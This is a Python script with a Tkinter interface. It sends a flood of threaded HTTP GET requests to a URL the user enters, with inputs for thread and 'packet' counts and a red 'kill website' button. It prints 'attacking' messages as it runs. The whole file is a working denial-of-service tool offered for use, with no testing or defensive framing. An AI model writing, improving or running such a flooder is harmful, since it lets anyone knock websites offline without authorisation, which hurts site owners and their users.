import concurrent.futures
import requests
from colorama import Fore, init
import socket
import tkinter as tk
import os
from tkinter import *
from tkinter.ttk import *

init(convert=True)
root = tk.Tk()
frame = tk.Frame(root)
frame.pack()


def sendpacket(link):
    try:
        requests.get(link, timeout=5)
        print(Fore.GREEN + "request sent")
    except Exception as ex:
        print(Fore.RED + "no response from site in 5s (dying)")
    return ''


def start():
    url = link.get()
    threadnum = int(threads.get())
    packetnum = int(packets.get())
    link.delete(0, tk.END)
    packets.delete(0, tk.END)
    threads.delete(0, tk.END)
    a = []
    for x in range(packetnum):
        a.append(url)
    ip = socket.gethostbyname(url.split(':')[1].split("/")[2])
    print(Fore.LIGHTBLACK_EX + f"attacking {url} ({ip}) with {threadnum} threads, {packetnum} total packets and 5 "
                               f"seconds of timeout")
    print(Fore.CYAN + "the GUI window will freeze, this is normal.")
    print(Fore.BLUE + "loading threads...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=threadnum) as executor:
        for value in zip(executor.map(sendpacket, a)):
            print()


if __name__ == '__main__':
    threads = tk.Entry()
    getthreads = tk.Label(text="enter threadcount")

    link = tk.Entry()
    packets = tk.Entry()
    enterlink = tk.Label(text="enter the url:")
    enterpackets = tk.Label(text="enter the number of packets:")
    button = tk.Button(frame,
                       text="kill website",
                       fg="red",
                       bg="black",
                       command=start)
    happening = tk.Text()
    enterlink.pack()
    link.pack()
    enterpackets.pack()
    packets.pack()
    getthreads.pack()
    threads.pack()
    button.pack()
    root.mainloop()
